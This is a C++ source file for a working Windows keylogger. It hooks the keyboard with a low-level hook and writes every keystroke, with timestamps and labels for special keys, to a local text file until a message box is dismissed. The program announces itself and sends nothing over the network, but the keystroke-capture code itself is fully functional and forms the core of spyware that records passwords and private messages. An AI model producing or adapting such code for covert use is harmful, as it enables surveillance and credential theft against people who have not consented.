#include <fstream>
#include <windows.h>
#include <shellapi.h>

using namespace std;

ofstream out("keys.txt", ios::out);
SYSTEMTIME lastTime = { 0 };
SYSTEMTIME localTime = { 0 };

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) lParam;

    GetLocalTime(&localTime);

    if(localTime.wHour != lastTime.wHour ||
        localTime.wMinute != lastTime.wMinute ||
        localTime.wSecond != lastTime.wSecond) {

        lastTime = localTime;
        out << endl << lastTime.wHour << ":" << lastTime.wMinute << ":" << lastTime.wSecond << " - ";
        out.flush();
    }

    if(wParam == WM_KEYDOWN) {
        switch (p->vkCode) {
            case VK_CAPITAL:    out << "<CAPSLOCK>";    break;
            case VK_SHIFT:      out << "<SHIFT>";       break;
            case VK_LCONTROL:   out << "<LCTRL>";       break;
            case VK_RCONTROL:   out << "<RCTRL>";       break;
            case VK_INSERT:     out << "<INSERT>";      break;
            case VK_END:        out << "<END>";         break;
            case VK_PRINT:      out << "<PRINT>";       break;
            case VK_DELETE:     out << "<DELETE>";      break;
            case VK_TAB:        out << "<TAB>";         break;
            case VK_BACK:       out << "<BACKSPACE>";   break;
            case VK_RETURN:     out << "<ENTER>";       break;

            case VK_LEFT:       out << "<LEFT>";        break;
            case VK_RIGHT:      out << "<RIGHT>";       break;
            case VK_DOWN:       out << "<DOWN>";        break;
            case VK_UP:         out << "<UP>";          break;

            default: // Printable Keys
                out << char (p->vkCode);
                break;
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int ShowCmd)
{
    GetLocalTime(&lastTime);
    out << lastTime.wHour << ":" << lastTime.wMinute << ":" << lastTime.wSecond << " - ";
    out.flush();

    // Set windows hook
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, hInstance, 0);

    MessageBox(NULL, "Check out keys.txt!\n Press OK to stop logging.", "Information", MB_OK);

    out.close();

    return 0;
}
